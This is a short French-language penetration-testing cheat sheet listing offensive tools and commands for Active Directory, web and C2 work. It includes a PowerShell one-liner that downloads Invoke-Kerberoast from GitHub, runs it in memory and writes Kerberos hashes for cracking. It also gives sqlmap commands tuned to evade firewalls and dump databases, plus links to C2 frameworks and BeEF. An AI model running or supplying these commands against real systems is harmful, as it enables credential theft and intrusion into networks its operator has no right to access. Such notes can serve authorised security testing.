# mycheatsheet

## AD

* linWinPwn super outil pour automatiser les attaques sur l'AD : https://github.com/lefayjey/linWinPwn
* https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/kerberoasting
### Windows 

	* IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 
* Il marche très bien et sort un fichier hashes.kerberoast
* https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/
* https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting.md
 
### bloodhound delete data
```
MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r
```
## Pentest Web
* whatweb
* gobuster
* Bypass firewall
	* sqlmap -u "http://..room.php?code=3" --dbs --random-agent --delay 1
* possible de passer à delay 10 pour mieux bypass mais plus long
* --dump -D information-schema --delay 5

## Kubernetes
* Hubble: Pour inspecter service et réseau sur K8S https://github.com/cilium/hubble

## C2C
* Vilain c'est un peu comme meterpreter mais un peu mieux fait : https://github.com/t3l3machus/Villain

# Network
* Legion: https://github.com/GoVanguard/legion
## Pentest plateforme
* Rekono : https://github.com/pablosnt/rekono?search=1
* Sniper: https://github.com/1N3/Sn1per

## BEEF XSS

https://www.golinuxcloud.com/beef-hacking-framework-tutorial/

https://programmingdigest.com/python-simple-http-server-a-quick-and-easy-way-to-serve-web-content/

